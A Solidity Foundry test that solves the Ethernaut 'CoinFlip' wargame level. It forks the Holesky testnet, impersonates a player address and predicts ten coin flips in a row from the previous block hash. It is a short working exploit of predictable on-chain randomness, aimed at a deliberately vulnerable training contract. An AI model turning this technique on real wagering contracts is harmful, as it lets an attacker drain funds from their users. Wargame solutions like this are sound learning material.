// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {CoinFlip} from "../../src/Ethernaut/CoinFlip.sol";

contract ContractTest is Test {
    function setUp() public {}

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        vm.createSelectFork(vm.rpcUrl("holesky"));
        vm.startPrank(playerAddress);
        CoinFlip coinFlip = CoinFlip(
            0x17f4f1980C78F124fe0e062592E1Da5600b34610
        );
        for (uint256 i = 0; i < 10; i++) {
            vm.roll(i + 1); //直接从fork下来的最新block开始会有问题，roll有时会不推动区块前进，foundry自己的问题
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 value = blockValue / FACTOR;
            bool side = value == 1;
            coinFlip.flip(side);
        }
        vm.stopPrank();
        assertTrue(coinFlip.consecutiveWins() >= 10);
    }
}
